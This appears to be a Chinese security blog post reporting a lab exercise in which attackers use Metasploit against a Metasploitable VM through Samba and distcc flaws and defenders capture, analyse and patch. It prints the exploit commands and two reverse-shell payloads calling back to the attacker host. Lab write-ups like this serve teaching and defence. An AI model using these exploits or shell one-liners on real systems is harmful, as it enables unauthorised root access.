<!DOCTYPE html>
<html>

<head>
  <meta http-equiv="Content-Type" content="text/html" charset="UTF-8" >
  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
  <title>Linux系统攻防对抗实践 | Blog of Secer</title>
  <meta name="description" content="" />
  <meta name="HandheldFriendly" content="True" />
  <meta name="MobileOptimized" content="320" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <link rel="stylesheet" type="text/css" href="/css/screen.css" />
  <link rel="stylesheet" type="text/css" href="/css/style.css" />
  <meta name="generator" content="Blog of Secer">

  
  
  

  
</head>

<!--
<body class="post-template">
-->
<body class="home-template">
<div id="perspective" class="perspective effect-movedown">
  <div class="container">
    <!-- wrapper -->
    <div class="wrapper">

      <header class="site-head"  style="background: #24282b url(/img/img-bg.jpg) 0 -20%" >
    <div class="vertical">
        <div class="site-head-content inner">
             <a class="blog-logo" href="/"><img src="/img/logo.svg" alt="Blog Logo"/></a> 
            <h1 class="blog-title">Blog of Secer</h1>
            <h2 class="blog-description"><button id="showMenu">Show Menu</button></h2>
        </div>
    </div>
</header>

      

<main class="content" role="main">
  <article class="post">
    <span class="post-meta">
      <time datetime="2012-10-11T01:07:30.000Z" itemprop="datePublished">
          2012-10-11
      </time>
    
    
    | 
    <a href='/tag/漏洞/'>漏洞</a>,
    
    <a href='/tag/Metasploit/'>Metasploit</a>,
    
    <a href='/tag/入侵/'>入侵</a>,
    
    <a href='/tag/Linux/'>Linux</a>
    
    
</span>
    <h1 class="post-title">Linux系统攻防对抗实践</h1>
    <section class="post-content">
      <p><b>一、实践目的</b><b></b></p>  <p>通过Linux系统攻防对抗实践，加深对Linux系统的认识，同时掌握Linux漏洞入侵和架设防御的初步方法。</p>  <p><b>二、实践内容</b><b></b></p>  <p>在Metasploit渗透攻击框架软件中寻找一个针对Linux系统服务的渗透攻击模块，在网络安全攻防实验环境中部署有漏洞的环境（如渗透利用第三方网络服务，需要找到并安装存在特定漏洞的版本），并使用metasploit进行攻击。</p>  <p>攻击方使用Metasploit渗透软件针对Linux <a name="baidusnap0"></a><b>Metasploitable</b>靶机实施网络攻击，防御方则在Metasploitatble上使用Tcpdump或Wireshark或Snort工具捕获攻击流，并分析出攻击者利用了哪个安全漏洞进行攻击，从官方网站上下载该安全漏洞补丁进行系统修补，双方合作给出攻防过程报告。</p>  <p><b>三、实验环境</b><b></b></p>  <p>为了完成本次实验，我们部署了如下的实验环境。</p>  <p>攻守双方使用两台笔记本电脑，并将它们直连成为一个局域网。在攻守双方的笔记本电脑上部 署Vmware Workstation软件，并分别建立攻击机、扫描机和防守机。其中攻方使用BackTrack4系统，并辅助使用WinXPattacker进行扫 描；守方使用Ubuntu 8.04－<b>Metasploitable</b>系统。</p>  <p>如下图，三台虚拟机使用Bridge方式联网，攻击机IP地址192.168.200.10，扫描机IP地址192.168.200.2；防守机IP地址192.168.200.11。</p>  <p><a href="http://www.91ri.org/wp-content/uploads/auto_save_image/2012/07/073740sCJ.png" target="_blank" rel="external"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image001" border="0" alt="clip_image001" src="http://img.cker.in/Linux_EFD9/clip_image001.png" width="738" height="352"></a></p>  <p><b>四、攻防实践过程</b><b></b></p>  <p>攻守双方首先将虚拟机启动起来，配置好网络环境并测试网络通畅后，攻守双发分别进行接下来的操作。</p>  <p><b>攻方过程</b><b></b></p>  <p><b>漏洞扫描及结果分析</b><b></b></p>  <p>为了确认防守方系统漏洞，攻方在扫描机上使用X-Scan 3.3对防守机进行了一次全面漏洞扫描。</p>  <p><a href="http://www.91ri.org/wp-content/uploads/auto_save_image/2012/07/073741iO8.png" target="_blank" rel="external"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image002" border="0" alt="clip_image002" src="http://img.cker.in/Linux_EFD9/clip_image002.png" width="794" height="482"></a></p>  <p>其中防守机开启的服务和具体的漏洞如下</p><a id="more"></a><p></p>  <p><a href="http://www.91ri.org/wp-content/uploads/auto_save_image/2012/07/073742VuO.png" target="_blank" rel="external"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image003" border="0" alt="clip_image003" src="http://img.cker.in/Linux_EFD9/clip_image003.png" width="795" height="375"></a></p>  <p>查看详细的扫描报告，可以得知该主机很多重要信息，</p>  <p>a)&#160;&#160; 从139端口可以获取该系统主机名为“<b>METASPLOITABLE</b>”，注释“<b>metasploitable</b> server (Samba 3.0.20-Debian)”；</p>  <p>b)&#160;&#160; 主机系统中存在许多用户，共35个，其中被禁止的33个，存活使用用户user、msfadmin；</p>  <p>c)&#160;&#160; 系统存在弱口令，用户user、msfadmin<a name="baidusnap1"></a><b>密码</b>与用户名一样，使用net use命令能够建立连接查看共享资源。ftp开放版本信息 ProFTPD 1.3.1 Server (Debian)，user这个用户在ftp中也可以使用；</p>  <p>d)&#160;&#160; telnet服务开放，可确定该系统为Ubuntu 8.04，用户user、msfadmin可以登录，并获得相应权限。如果不存在弱口令，通过截获该telnet数据也能获取用户口令。</p>  <p><b>攻击方式选择</b><b></b></p>  <p>根据上面的分析结果，最简单的攻击方式就是通过telnet使用user或msfadmin用户登录即可，但这样的攻击并不是我们的实验目的，因此我们暂时忽略系统弱口令的问题，通过第三方软件的漏洞获取系统的控制权。</p>  <p><a href="http://www.91ri.org/wp-content/uploads/auto_save_image/2012/07/073743JP6.png" target="_blank" rel="external"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image004" border="0" alt="clip_image004" src="http://img.cker.in/Linux_EFD9/clip_image004.png" width="804" height="367"></a></p>  <p>从上面的漏洞扫描可以看出，防守机的漏洞很多，我们可以使用SMB漏洞、distcc漏洞等进行攻击。因为SMB是Samba软件的服务，而Samba服 务是运行在root权限下，所以一旦攻击成功，将获得权限为root的shell。我们本次实验主要使用SMB漏洞进行攻击，并尝试使用distcc漏 洞。</p>  <p><b>攻击入侵</b><b></b></p>  <p>完成了以上的分析，我们终于进入了今天的重头戏，攻击环节。</p>  <p>在命令行窗口输入命令</p>  <p>msfconsole</p>  <p>将开启我们要使用的攻击工具：metasploit，如下图，</p>  <p><a href="http://www.91ri.org/wp-content/uploads/auto_save_image/2012/07/073744zNQ.png" target="_blank" rel="external"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image005" border="0" alt="clip_image005" src="http://img.cker.in/Linux_EFD9/clip_image005.png" width="806" height="615"></a></p>  <p>首先，我们使用SMB漏洞对防御机进行攻击，并设定payload为reverse（在没有防火墙的情况下，选择任意的shell payload都是可以的，本实验的payload是任意选取的），依次输入如下命令，使用SMB漏洞对防守机进行攻击，</p>  <p>use exploit/multi/samba/usermap_script</p>  <p>set payload cmd/unix/reverse</p>  <p>set rhost 192.168.200.11</p>  <p>set lhost 192.168.200.10</p>  <p>exploit</p>  <p>如下图，攻击后成功的获得了一个root权限的shell，攻击成功！</p>  <p><a href="http://www.91ri.org/wp-content/uploads/auto_save_image/2012/07/0737454HR.png" target="_blank" rel="external"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image006" border="0" alt="clip_image006" src="http://img.cker.in/Linux_EFD9/clip_image006.png" width="815" height="615"></a><a href="http://www.91ri.org/wp-content/uploads/auto_save_image/2012/07/07374619G.png" target="_blank" rel="external"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image007" border="0" alt="clip_image007" src="http://img.cker.in/Linux_EFD9/clip_image007.png" width="821" height="625"></a></p>  <p>断开当前的连接，依次输入如下命令，使用distcc漏洞进行攻击。</p>  <p>back</p>  <p>use exploit/unix/misc/distcc_exec</p>  <p>set payload cmd/unix/reverse_perl</p>  <p>set rhost 192.168.200.11</p>  <p>set lhost 192.168.200.10</p>  <p>exploit</p>  <p>如下图，攻击成功后出现一个可以使用的shell，但是没有root权限。   <br><a href="http://www.91ri.org/wp-content/uploads/auto_save_image/2012/07/073747tJ0.png" target="_blank" rel="external"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image008" border="0" alt="clip_image008" src="http://img.cker.in/Linux_EFD9/clip_image008.png" width="815" height="626"></a></p>  <p><a href="http://www.91ri.org/wp-content/uploads/auto_save_image/2012/07/073748m0b.png" target="_blank" rel="external"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image009" border="0" alt="clip_image009" src="http://img.cker.in/Linux_EFD9/clip_image009.png" width="811" height="619"></a></p>  <p>但继续输入命令时却没有反应，后证实是被防守方人为中断了。</p>  <p>为了使用更高权限的命令，我们需要root权限的shell。因此再次使用SMB漏洞进行攻击。在命令行下输入如下命令，</p>  <p>back</p>  <p>use exploit/multi/samba/usermap_script</p>  <p>set payload cmd/unix/reverse</p>  <p>set rhost 192.168.200.11</p>  <p>set lhost 192.168.200.10</p>  <p>exploit</p>  <p>然后在获得的shell中输入reboot命令，如下图，</p>  <p><a href="http://www.91ri.org/wp-content/uploads/auto_save_image/2012/07/073749aw5.png" target="_blank" rel="external"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image010" border="0" alt="clip_image010" src="http://img.cker.in/Linux_EFD9/clip_image010.png" width="810" height="609"></a></p>  <p>这时，防守机系统重启了，攻击成功！</p>  <p><b>守方过程</b><b></b></p>  <p><b>防守机上观察到的攻击迹象</b><b></b></p>  <p>在防守机启动之后，立即使用如下命令抓取系统接收和发送的报文，并将结果保存到result.cap文件中。</p>  <p>sudo tcpdump –s 00 –w result.cap &amp;</p>  <p>然后等待一段时间后，使用如下命令查看系统进程，</p>  <p>ps –e | more</p>  <p>发现数个可疑的telnet进程，后来证实其为攻击时使用的shell。如下图，</p>  <p><a href="http://www.91ri.org/wp-content/uploads/auto_save_image/2012/07/073751UnD.png" target="_blank" rel="external"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image011" border="0" alt="clip_image011" src="http://img.cker.in/Linux_EFD9/clip_image011.png" width="790" height="595"></a></p>  <p>果断将telnet进程杀掉。但随后不久，收到一个来自用户root的消息，机器便重启了……</p>  <p><a href="http://www.91ri.org/wp-content/uploads/auto_save_image/2012/07/073753aZk.png" target="_blank" rel="external"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image012" border="0" alt="clip_image012" src="http://img.cker.in/Linux_EFD9/clip_image012.png" width="808" height="604"></a></p>  <p><b>报文分析</b><b></b></p>  <p>为了弄清楚重启的真正原因。当机器重启之后，果断断网。导出抓取的报文文件，并使用wireshark进行分析。</p>  <p>简单的查看抓取到的报文，在短短的30分钟内，一共有128768个报文。如此巨量的报文中，绝大多数报文都是成片的同一种协议的报文，如下图，</p>  <p><a href="http://www.91ri.org/wp-content/uploads/auto_save_image/2012/07/0737543EL.png" target="_blank" rel="external"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image013" border="0" alt="clip_image013" src="http://img.cker.in/Linux_EFD9/clip_image013.png" width="816" height="326"></a>因此可以断定，攻击机正在进行扫描，而真正的攻击应该在最后。从后向前查看报文内容发现，倒数第二条报文是一个TCP数据包，其中报文的内容是正是reboot！可以断定正是这条命令导致了系统重启。</p>  <p><a href="http://www.91ri.org/wp-content/uploads/auto_save_image/2012/07/073758MKT.png" target="_blank" rel="external"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image014" border="0" alt="clip_image014" src="http://img.cker.in/Linux_EFD9/clip_image014.png" width="813" height="629"></a></p>  <p>经过对报文仔细的分析，可以确定的攻击有三次，分别如下图所示，其中攻击的漏洞和携带的攻击脚本分别为，   <table border="1" cellspacing="0" cellpadding="0"><tbody>       <tr>         <td valign="top" width="102">           <p><b>漏洞名称</b></p>         </td>          <td valign="top" width="113">           <p><b>相关网址</b></p>         </td>          <td valign="top" width="265">           <p><b>攻击脚本</b></p>         </td>          <td valign="top" width="88">           <p><b>执行的命令</b></p>         </td>       </tr>        <tr>         <td valign="top" width="102">           <p><b>SMB</b><b>漏洞</b><b> CVE-2007-2447</b></p>         </td>          <td valign="top" width="113">           <p><a href="http://www.samba.org/samba/security/CVE-2007-2447.html" target="_blank" rel="external">http://www.samba.org/samba/security/CVE-2007-2447.html</a></p>         </td>          <td valign="top" width="265">           <p><code>nohup sh -c ‘(sleep 4495|telnet 192.168.200.10 4444|while : ; do sh &amp;amp;&amp;amp; break; done 2&amp;gt;&amp;amp;1|telnet 192.168.200.10 4444 &amp;gt;/dev/null 2&amp;gt;&amp;amp;1 &amp;amp;)’</code></p>         </td>          <td valign="top" width="88">           <p>idusers</p>         </td>       </tr>        <tr>         <td valign="top" width="102">           <p><b>Distcc</b><b>漏洞</b><b> CVE-2004-2687</b></p>         </td>          <td valign="top" width="113">           <p><a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=2004-2687" target="_blank" rel="external">http://cve.mitre.org/cgi-bin/cvename.cgi?name=2004-2687</a></p>         </td>          <td valign="top" width="265">           <p>perl -MIO -e ‘$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,”192.168.200.10:4444”);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;’</p>         </td>          <td valign="top" width="88">           <p>idusers</p>         </td>       </tr>        <tr>         <td valign="top" width="102">           <p><b>同第一个</b></p>         </td>          <td valign="top" width="113">           <p>同第一个</p>         </td>          <td valign="top" width="265">           <p>同第一个</p>         </td>          <td valign="top" width="88">           <p>idreboot</p>         </td>       </tr>     </tbody></table> </p>  <p><a href="http://www.91ri.org/wp-content/uploads/auto_save_image/2012/07/073800D6E.png" target="_blank" rel="external"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image015" border="0" alt="clip_image015" src="http://img.cker.in/Linux_EFD9/clip_image015.png" width="818" height="630"></a></p>  <p><a href="http://www.91ri.org/wp-content/uploads/auto_save_image/2012/07/073803dLO.png" target="_blank" rel="external"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image016" border="0" alt="clip_image016" src="http://img.cker.in/Linux_EFD9/clip_image016.png" width="817" height="629"></a></p>  <p><a href="http://www.91ri.org/wp-content/uploads/auto_save_image/2012/07/073806SOd.png" target="_blank" rel="external"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image017" border="0" alt="clip_image017" src="http://img.cker.in/Linux_EFD9/clip_image017.png" width="816" height="636"></a></p>  <p>漏洞修补</p>  <p>由于防守机是ubuntu系统，所以很容易将软件升级到最新版本。在命令行执行如下命令，</p>  <p>sudo apt-get update</p>  <p>sudo apt-get install samba</p>  <p>或者将相应的服务禁掉，</p>  <p>sudo /etc/init.d/samba stop</p>  <p>sudo /etc/init.d/distcc stop</p>  <p>但是升级distcc时会提示没有更新的版本，到其官网上下载最新版本，卸载旧版本并安装后可以修补漏洞。</p>  <p><b>五、攻防实践总结</b><b></b></p>  <p>实践中遇到问题和总结的经验，</p>  <p><b>攻方</b><b></b></p>  <p>a)&#160;&#160; 漏洞选择，因为有文档指出<b>Metasploitable</b>靶机存在的漏洞，所以在这个方向上可以减少攻击过程中尝试的漏洞；</p>  <p>b)&#160;&#160; 如果获得的shell权限不是root级别的，需要继续使用本地溢出进行提权，本人对这些漏洞信息掌握很少。</p>  <p><b>守方</b><b></b></p>  <p>a)&#160;&#160; 抓取的报文数量巨大，从中找出有用的信息比较困难。</p>  <p>b)&#160;&#160; 从攻击的过程中推测被利用的漏洞必须具备相当的背景知识，并且需要熟练运用搜索引擎和官方网站。</p>  <p>link:<a href="http://netsec.ccert.edu.cn/cnsc/2011/06/19/linux%E7%B3%BB%E7%BB%9F%E6%94%BB%E9%98%B2%E5%AF%B9%E6%8A%97%E5%AE%9E%E8%B7%B5/" target="_blank" rel="external">http://netsec.ccert.edu.cn/cnsc/2011/06/19/linux%E7%B3%BB%E7%BB%9F%E6%94%BB%E9%98%B2%E5%AF%B9%E6%8A%97%E5%AE%9E%E8%B7%B5/</a></p>
    </section>
    <footer class="post-footer">
      <section class="author">
    <h4>Secer</h4>
    <p>记录互联网安全历程与个人成长经历</p>
</section>
      <section class="share">
    <h4>Share this post</h4>
    <a class="icon-sina-weibo" href="http://v.t.sina.com.cn/share/share.php?title=记录互联网安全历程与个人成长经历 ?url=http://ha.cker.in/886.seo/" target="_blank">
        <span class="hidden">weibo</span>
    </a>
    <a class="icon-twitter" href="http://twitter.com/share?url=http://ha.cker.in/886.seo/"
       onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
        <span class="hidden">Twitter</span>
    </a>
    <a class="icon-facebook" href="https://www.facebook.com/sharer/sharer.php?u=http://ha.cker.in/886.seo/"
       onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
        <span class="hidden">Facebook</span>
    </a>
    <a class="icon-google-plus" href="https://plus.google.com/share?url=http://ha.cker.in/886.seo/"
       onclick="window.open(this.href, 'google-plus-share', 'width=490,height=530');return false;">
        <span class="hidden">Google+</span>
    </a>
</section>

    </footer>
  </article>
  <nav class="pagination" role="pagination">
    
    <a class="newer-posts" href="/890.seo/">
        ← Test..
    </a>
    
    <span class="icon-logo">•</span>
    
    <a class="older-posts" href="/883.seo/">
        友情检测格力官方网站 →
    </a>
    
</nav>

  <div id="comment" class="comments-area">
    <h4 class="title"><a href="#disqus_comments" name="disqus_comments">Comments</a></h4>
    
</div>

</main>


      
<footer class="site-footer">
  
  <div class="inner">
     <section class="copyright">All content copyright <a href="/">Blog of Secer</a> &copy; 2014 &bull; All rights reserved.</section>
     <section class="poweredby">Proudly published with <a class="icon-ghost" href="http://zespia.tw/hexo/">Hexo</a></section>
  </div>
</footer>

      <script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>

<script type="text/javascript" src="/js/jquery.fitvids.js"></script>
<script type="text/javascript" src="/js/index.js"></script>
<script type="text/javascript" src="/js/menu.js"></script>





  </div>
</div>

<nav  class="outer-nav top horizontal">

          <a class="icon-home"  href="/"><span>Home</span></a>

          <a class="icon-news"  href="/archives"><span>Archive</span></a>

          <a class="icon-image"  href="/images"><span>Images</span></a>

          <a class="icon-wiki"  href="/wiki/"><span>Wiki</span></a>

          <a class="icon-Favorites"  href="/favorites"><span>Favorites</span></a>

          <a class="icon-mail"  href="/about/"><span>Contact</span></a>

</nav>

</div>
</body>
</html>
